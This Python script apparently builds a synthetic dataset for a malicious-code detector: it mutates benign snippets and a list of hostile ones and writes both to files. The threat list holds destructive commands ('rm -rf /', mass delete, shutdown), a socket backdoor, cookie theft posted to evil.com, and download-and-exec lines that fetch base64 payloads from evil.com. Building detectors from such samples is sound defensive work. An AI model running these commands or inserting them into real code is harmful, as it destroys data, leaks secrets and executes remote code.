# synthetic_generator.py
import random
import os
import shutil
from pathlib import Path

SAFE_TEMPLATES = [
    "import math\ndef func(x):\n    return math.sqrt(x) + 3.14",
    "import json\ndata = {'name': 'test'}\nwith open('data.json', 'w') as f:\n    json.dump(data, f)",
    "import re\ntext = 'Hello 123'\nmatch = re.search(r'\\d+', text)\nprint(match.group())",
    "import datetime\nnow = datetime.datetime.now()\nprint(now.strftime('%Y-%m-%d'))",
    "import collections\ncounter = collections.Counter(['a','b','a'])\nprint(counter)",
    "def fib(n):\n    a,b=0,1\n    for _ in range(n):\n        yield a\n        a,b=b,a+b",
    "import random\nprint(random.choice(['win','lose','draw']))",
    "from pathlib import Path\nfor f in Path('.').iterdir():\n    if f.is_file():\n        print(f.name)",
    "import csv\nwith open('data.csv', 'w') as f:\n    writer = csv.writer(f)\n    writer.writerow(['col1', 'col2'])",
    "import itertools\nfor combo in itertools.combinations([1,2,3], 2):\n    print(combo)",
    "import requests\nresponse = requests.get('https://api.github.com')\nprint(response.status_code)",
    "import requests\nfrom bs4 import BeautifulSoup\nhtml = '<html><body>Hello</body></html>'\nsoup = BeautifulSoup(html, 'html.parser')\nprint(soup.text)",
    "import requests\nimport json\ndata = requests.get('https://jsonplaceholder.typicode.com/posts/1').json()\nprint(data['title'])",
    "import requests\nimport time\nfor i in range(3):\n    try:\n        r = requests.get('https://httpbin.org/delay/1', timeout=2)\n print(r.elapsed)\n    except:\n        pass",
    "import base64\nencoded = 'SGVsbG8gV29ybGQ='\nprint(base64.b64decode(encoded).decode())",
    "import base64\nimport json\ndata = {'name': 'test'}\nencoded = base64.b64encode(json.dumps(data).encode())\nprint(encoded)",
]

THREAT_TEMPLATES = [
    "import os\nos.system('rm -rf /')",
    "import subprocess\nsubprocess.Popen(['python', '-c', 'import os; os.system(\"calc\")'])",
    "import socket\ns = socket.socket()\ns.connect(('127.0.0.1', 4444))\ns.send(b'backdoor')",
    "import os\nos.popen('whoami').read()",
    "import sys\nsys.modules['os'].system('shutdown /s /t 0')",
    "import requests\nrequests.post('http://evil.com/steal', data={'cookie': 'abc'})",
    "import requests\nrequests.get('http://evil.com/payload')",  # <-- Added GET
    "import requests\nrequests.delete('http://evil.com/exfil')",  # <-- Added DELETE
    "exec('import os; os.system(\"del /f /q C:\\\\*\")')",
    "import base64\ncode = 'aW1wb3J0IG9zO29zLnN5c3RlbSgiZWNobyBlaWwiKQ=='\nexec(base64.b64decode(code).decode())",
    "import base64\nimport requests\nexec(base64.b64decode(requests.get('http://evil.com/payload').text))",  # <-- Combined
    "import ftplib\nftp = ftplib.FTP('evil.com')\nftp.login('user','pass')\nftp.retrlines('LIST')",
    "import smtplib\nsmtp = smtplib.SMTP('smtp.evil.com')\nsmtp.sendmail('a@a.com', 'b@b.com', 'malicious')",
    "__import__('os').system('calc.exe')",  # <-- Obfuscated import
    "eval('__import__(\\\"os\\\").system(\\\"whoami\\\")')",  # <-- eval variant
    "import requests\nimport base64\nexec(base64.b64decode(requests.get('http://evil.com/payload').text))",  # existing
    "import requests\nimport base64\nexec(base64.b64decode(requests.post('http://evil.com/payload').text))",  # add post variant
    "import requests\nimport base64\ncode = requests.get('http://evil.com/payload').text\nexec(base64.b64decode(code))",  # variant
    "import requests\nimport base64\nexec(base64.b64decode(requests.delete('http://evil.com/payload').text))",  # delete
    "import requests\nimport base64\nrequests.get('http://evil.com/payload')  # just a download, but then exec later",  # separate lines
    "import base64\nimport requests\nurl = 'http://evil.com/payload'\ndata = requests.get(url).text\nexec(base64.b64decode(data))",
]

def mutate(code, mutations=3):
    """Apply random mutations to code to generate variations."""
    lines = code.split('\n')
    for _ in range(mutations):
        op = random.choice(['rename_var', 'add_comment', 'swap_import', 'add_noop'])
        if op == 'rename_var' and len(lines) > 1:
            # Replace a common variable name with random one
            old = random.choice(['x', 'data', 'result', 'temp'])
            new = random.choice(['foo', 'bar', 'baz', 'qux', 'var' + str(random.randint(1,100))])
            lines = [line.replace(old, new) for line in lines]
        elif op == 'add_comment':
            idx = random.randint(0, len(lines)-1)
            lines[idx] = lines[idx] + '  # ' + random.choice(['test', 'debug', 'fixme', 'note'])
        elif op == 'swap_import':
            # Swap order of two imports if present
            import_lines = [i for i, l in enumerate(lines) if l.startswith('import')]
            if len(import_lines) >= 2:
                i, j = random.sample(import_lines, 2)
                lines[i], lines[j] = lines[j], lines[i]
        elif op == 'add_noop':
            lines.insert(random.randint(0, len(lines)), '    pass  # no-op')
    return '\n'.join(lines)

def generate_dataset(safe_dir, threat_dir, num_samples=50):
    os.makedirs(safe_dir, exist_ok=True)
    os.makedirs(threat_dir, exist_ok=True)
    
    # Generate safe variations
    for i in range(num_samples):
        template = random.choice(SAFE_TEMPLATES)
        mutated = mutate(template, mutations=random.randint(1,5))
        with open(os.path.join(safe_dir, f'synth_safe_{i+1}.py'), 'w') as f:
            f.write(mutated)
    
    # Generate threat variations
    for i in range(num_samples):
        template = random.choice(THREAT_TEMPLATES)
        mutated = mutate(template, mutations=random.randint(1,5))
        with open(os.path.join(threat_dir, f'synth_threat_{i+1}.py'), 'w') as f:
            f.write(mutated)
    
    print(f"[*] Generated {num_samples} safe and {num_samples} threat variants.")

if __name__ == "__main__":
    generate_dataset("./training_data/safe", "./training_data/threat", num_samples=50)